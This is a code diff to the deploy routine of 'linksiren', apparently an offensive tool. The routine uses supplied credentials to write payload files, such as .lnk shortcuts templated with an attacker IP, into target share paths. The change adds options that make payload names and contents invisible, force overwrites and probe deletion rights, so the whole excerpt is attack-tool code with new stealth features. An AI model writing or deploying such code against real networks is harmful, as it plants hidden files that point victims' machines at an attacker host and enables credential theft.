@@ -32,6 +32,8 @@ from linksiren.pure_functions import (
     is_valid_payload_name,
     create_lnk_payload,
     compute_threshold_date,
+    make_invisible_payload_name,
+    make_invisible_payload_contents,
 )
 
 
@@ -159,9 +161,10 @@ def handle_deploy(args, credentials):
     if not is_valid_payload_name(args.payload, available_extensions):
         return
 
-    template_path = Path(__file__).parent / f"template{Path(args.payload).suffix}"
+    payload_extension = Path(args.payload).suffix
+    template_path = Path(__file__).parent / f"template{payload_extension}"
 
-    if Path(args.payload).suffix == ".lnk":
+    if payload_extension == ".lnk":
         lnk_template = get_lnk_template(template_path)
         payload_contents = create_lnk_payload(args.attacker, lnk_template)
     else:
@@ -169,11 +172,25 @@ def handle_deploy(args, credentials):
             template_contents = template_file.read()
             payload_contents = template_contents.format(attacker_ip=args.attacker)
 
+    payload_name = args.payload
+    if getattr(args, "invisible", False):
+        payload_name = make_invisible_payload_name(payload_name)
+        payload_contents = make_invisible_payload_contents(
+            payload_contents, payload_extension
+        )
+
+    force = getattr(args, "force", False)
+    probe_delete = getattr(args, "probe_delete", False)
+
     for target in targets:
         target.connect(credentials)
         for path in target.paths:
             new_payload_path = target.write_payload(
-                path=path, payload_name=args.payload, payload=payload_contents
+                path=path,
+                payload_name=payload_name,
+                payload=payload_contents,
+                force=force,
+                probe_delete=probe_delete,
             )
             if new_payload_path is not None:
                 payloads_written.append(new_payload_path)
